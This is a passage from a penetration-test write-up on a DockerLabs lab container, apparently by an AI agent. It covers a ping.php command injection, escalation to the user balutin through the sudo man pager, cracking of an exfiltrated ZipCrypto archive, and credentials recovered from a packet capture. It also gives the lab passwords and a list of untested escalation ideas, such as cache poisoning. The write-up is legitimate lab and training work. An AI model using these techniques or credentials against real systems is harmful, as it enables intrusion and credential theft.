**Why it is still stated, and how it errs.** It is stated because a section whose purpose is to let a reader trust the numbers should not omit them. But it is derived from what I **retained**, and retention is not the same as activity: the six `su` password probes, the several `sudo -n -l` probes, and the probe whose output went only to my terminal were never archived individually. The true figure is **at least** 65 and the error is unidirectional — **upward**. A count that can only undercount makes a thin engagement look rigorous, which is precisely the failure mode worth naming.

### I11 — The brief's own hypothesis was wrong, and I nearly inherited it

**Defect.** The task brief warned that `ping` might not be installed, which would make branch one a dead sink and change the meaning of every `200` on the page. It is installed (`/usr/bin/ping`, 90568 bytes) and branch one demonstrably executes four ICMP echoes.

**What it would have caused me to write.** A §1 stating that the first branch is inert and that a `200` is therefore meaningless here — which would have been a **false negative on a live sink**, sourced not from measurement but from an inherited assumption, and dressed in the vocabulary of a finding. It would also have weakened every control in the ladder, since the positive control at Hop 1 is exactly the thing the brief said would not work.

**Class.** Premise inheritance. A hypothesis supplied by the brief behaves like a measurement until it is checked, and checking it costs one command.

---

## 6. Reward

**There is no flag token in this image, and that absence is measured, not assumed.**

```
$ find / -xdev \( -iname "*flag*" -o -iname "*token*" -o -iname "*reward*" \) 2>/dev/null \
    | grep -vE "python|/usr/lib|/usr/share"
  → no results outside PHP's tokenizer module paths

$ ls -la /root/        → .bashrc, .local, .profile     (no flag.txt)
$ find /root -type f   → /root/.profile, /root/.bashrc
```

Whole-filesystem sweep for flag/token/reward names (0 hits), plus a direct enumeration of `/root` as the only plausible hiding place (no artefact). Consistent with the rest of the image: a single `ping.php`, one encrypted archive, one capture. DockerLabs labs of this family do not ship a flag file; the deliverable is the chain.

**What was actually recovered** — the reward this lab does contain, obtained legitimately through the RCE and the sudoers escalation:

| Artefact | Value |
|---|---|
| Archive password | `chocolate` (ZipCrypto, candidate 22,574 of 101,074) |
| Recovered file | `traffic.pcap`, 375 bytes, `sha256 e98d75f0…d97a4ce8c` |
| Credential 1 (cleartext form body) | `root` / `secretitosecretazo!` |
| Credential 2 (Base64 auth header) | `root` / `SuperSecret123!` |
| Highest identity reached | `uid=1000(balutin)` |

Both credentials were then tested and **both failed** against local `su` (`su: Authentication failure`, one 10 s `timeout` each, `evidence/privesc_success.txt`). The capture's host is `ejemplo.com`, which is not this container. So the honest statement is: **credential recovery completed; root was not reached, and the recovered credentials do not unlock anything here.** The absence of a flag is corroborated by the absence of any service that would consume those credentials — §1 measured exactly one listener, and it is an unauthenticated web page.

---

## 7. NOT tested

Declared as gaps, not closures.

1. **UDP.** `/proc/net/udp` is empty and `/proc/net/tcp6` has zero rows, but I performed **no UDP probe from outside the container** and no `nmap -sU`. The kernel tables are the only evidence. A UDP service bound in a way that does not appear in `/proc/net/udp` (e.g. via a raw socket or a namespace not visible to this PID) would be invisible to my method. *Untested, not closed.*
2. **Other hosts on the Docker network.** The brief scoped `172.17.0.8` only. I did not sweep `172.17.0.0/24`. The image itself was not audited for other services.
3. **`man` manpage-content execution paths.** I tested `'e` and `""e` shell escapes in a crafted page and they rendered as literal text. I did **not** enumerate man-db's other preprocessor hooks (`zsoelim`, `manconv`, `MANROFFSEQ`) beyond noting that `MANROFFSEQ` is subject to the same `env_reset`/`no-SETENV` constraint that killed `MANPAGER`. A `.so`-include trick against `zsoelim` remains unexplored.
4. **`apache2` → `root` paths.** `www-data` cannot write the docroot (measured: absent from the writable set), so a webshell drop was not possible. I did not test the mod_cache directory (`/var/cache/apache2/mod_cache_disk`, writable by `www-data`) as a cache-poisoning primitive — it is writable, and poisoning it is a real technique, but there is no second vhost or proxy to serve the poisoned entry.
5. **Balutin's post-escalation options.** Having `balutin` code execution, I measured `sudo -n -l` (no sudo) and the archive. I did not enumerate balutin's home beyond dotfiles and the zip, and did not check for setuid/`sgid` binaries **inside** paths balutin can reach, nor for cron entries owned by balutin.
6. **The full wordlist space.** 101,074 candidates (`sorted-passwords.txt`) found the password at position 22,574. The larger `Passwords.txt` (4.9M) was never run. The crack is therefore complete for this wordlist, not for all wordlists.
7. **Password reuse for `balutin`.** I tested the pcap credentials and `chocolate` against **root** only. I did not test them against `su balutin`, which is the more natural target given the sudoers rule names that account. This is a real gap and it is cheap to close.
8. **TLS.** Port 80 only; no HTTPS listener exists to assess.

---

## 8. Evidence inventory

Only files a reader can obtain. Paths relative to `corpus/73/evidence/`.

| File | What it is |
|---|---|
| `src_ping_php.txt` | The 32-line vulnerable source, read from the container with line numbers |
| `target_recon.txt` | `/proc/net/tcp` + `/proc/net/udp`, `ping` presence, docroot listing, container `id` |
| `target_recon2.txt` | `/proc/net/tcp6`, Apache `User`/`Group`, full `ps aux` process tree, PHP version, mods-enabled |
| `ladder.txt` | The 4-request control ladder: baseline, both negatives, the conjunction |
| `sweep.txt` | 8-request metacharacter sweep, backslash pattern held constant |
| `control.txt` | Backtick controls: repeat of the empty body, marker write, marker `stat`, semicolon repeat |
| `marker_ladder.txt` | The nonce marker write, the empty-nonce failure, and the OOB `stat -c` |
| `nonce.txt` | The nonce used: `CHOCOPING73-4bccb96faa6a` |
| `privesc_identity.txt` | Identity probe plus `sudo -n -l`, SUID/SGID enumeration, `sudo -u balutin` allowlist tests |
| `privesc_writable.txt` | `man -c` / `-P` / `MANPAGER` negative tests, crafted-manpage negative, writable-path sweep, cron, capabilities |
| `privesc_success.txt` | `script`-based `man -P` escalation, `EUID=1000` proof, zip copy, `su` credential tests |
| `php_and_logs.txt` | `php.ini` restriction values and the `error.log` witness of line 17 failing on every bypass request |
| `artifact_hunt_root.txt` | **Operator-side** (host root, not via the RCE): filesystem sweep, `/home/balutin` listing, zip contents |
| `reward_probe_root.txt` | **Operator-side**: the flag-absence sweep and `/root` enumeration backing §6 |
| `secretito.zip` | The archive as pulled from the target, 483 bytes, `sha256 85e98bd7…f81cd51` |
| `zip_b64_raw.txt` | Raw exfiltration of the archive through the RCE response body |
| `zipcrypto_crack.py` | The ZipCrypto verifier, carrying its own validation rationale in comments |
| `cand_themed.txt` | The 123 themed candidates tried before the wordlist run |
| `pcap_analysis.txt` | File type, hashes, `zipinfo` encryption facts, pcap header, extracted strings, decoded Basic auth, crack log |
| `traffic.pcap` | The recovered capture, 375 bytes |
| `restore_verify.txt` | `stat -c` absence proof for every created artefact, empty `/tmp`, docroot checksum, listener table |
| `work_count.txt` | The 65-request accounting and its derivation |

**Two files are labelled operator-side for a reason.** `artifact_hunt_root.txt` and `reward_probe_root.txt` were produced with host `docker exec`, which runs as **root**, not through the RCE chain. They are used only to establish *what exists* in the image (§6 flag absence) and never as evidence for a claim about what the attack chain can reach. Every reachability claim in §3 and §4 comes from a request through `172.17.0.8`.

**Restore.** Every artefact created in the target was removed and its absence proven with `stat -c`, not inferred from a listing (`restore_verify.txt`). `/tmp` returns empty. `/var/www/html/ping.php` is unchanged at 1011 bytes, mtime `2025-04-05 11:13:39`, `md5 4f1dcc0a24757fa81ca35ce1f55852e9`. `/home/balutin/` is untouched. `/proc/net/tcp` still shows the single `00000000:0050` listener. The container was neither stopped nor removed.